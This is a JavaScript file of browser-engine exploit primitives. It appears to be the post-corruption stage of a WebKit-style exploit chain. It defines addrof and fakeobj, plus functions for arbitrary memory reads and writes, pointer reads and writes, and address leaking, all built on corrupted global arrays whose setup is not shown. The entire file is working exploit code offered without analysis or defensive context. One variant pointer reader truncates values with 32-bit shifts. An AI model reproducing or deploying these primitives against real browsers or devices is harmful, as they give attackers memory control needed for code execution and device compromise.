function i48_put(x, arr) {
  arr[4] = x | 0;
  arr[5] = (x / 4294967296) | 0;
}

function i48_get(arr) {
  return arr[4] + arr[5] * 4294967296;
}

function addrof(obj) {
  g_leak_object.a = obj;
  return i48_get(g_leak_array);
}

function fakeobj(addr) {
  i48_put(addr, g_leak_array);
  return g_leak_object.a;
}

function rw_mem_setup(_src, size) {
  i48_put(_src, g_arb_master);
  g_arb_master[6] = size;
}

function read_mem(_src, size) {
  rw_mem_setup(_src, size);
  //Converts iterable object (g_arb_slave) to an array.
  return Array.from(g_arb_slave.slice(0, size));
}

function read_mem_s(ptr, size) {
  rw_mem_setup(ptr, size);
  return g_arb_slave.toString();
}

function read_mem_bytes(ptr, size) {
  rw_mem_setup(ptr, size);
  var bytes = new Uint8Array(size);
  bytes.set(g_arb_slave);
  return bytes;
}

function read_mem_as_string(ptr, size) {
  const bytes = read_mem_bytes(ptr, size);
  return String.fromCharCode.apply(null, bytes);
}

function write_mem(ptr, data) {
  rw_mem_setup(ptr, data.length);
  g_arb_slave.set(data);
}
/**
 * Reads an 8-byte pointer from the specified address in memory.
 * @param {Number} address The memory address to read from.
 * @returns {Number} The 8-byte pointer value at the specified address.
 */
function read_ptr_at(address) {
  const BYTES_PER_PTR = 8;
  const bytes = read_mem(address, BYTES_PER_PTR);
  let ptrValue = 0;

  // Convert bytes to 8-byte pointer value
  for (let i = BYTES_PER_PTR - 1; i >= 0; i--) {
    ptrValue = 256 * ptrValue + bytes[i];
  }

  return ptrValue;
}
function read_ptr_at22(address) {
  const BYTES_PER_PTR = 8;
  const bytes = read_mem(address, BYTES_PER_PTR);
  let ptrValue = 0;

  // Convert bytes to 8-byte pointer value
  for (let i = BYTES_PER_PTR - 1; i >= 0; i--) {
    ptrValue = (ptrValue << 8) | bytes[i];
  }

  return ptrValue;
}

/**
 * Writes an 8-byte pointer to the specified address in memory.
 * @param {Number} address The memory address to write to.
 * @param {Array} data The data to write at memory address.
 */
function write_ptr_at(address, data) {
  const bytes = new Uint8Array(8);
  for (let i = 0; i < 8; i++) {
    bytes[i] = data & 0xff;
    data /= 256;
  }
  write_mem(address, bytes);
}

function hex(x) {
  return Number(x).toString(16);
}

var malloc_nogc = [];

function malloc(size) {
  var arr = new Uint8Array(size);
  malloc_nogc.push(arr);
  return read_ptr_at(addrof(arr) + 0x10);
}
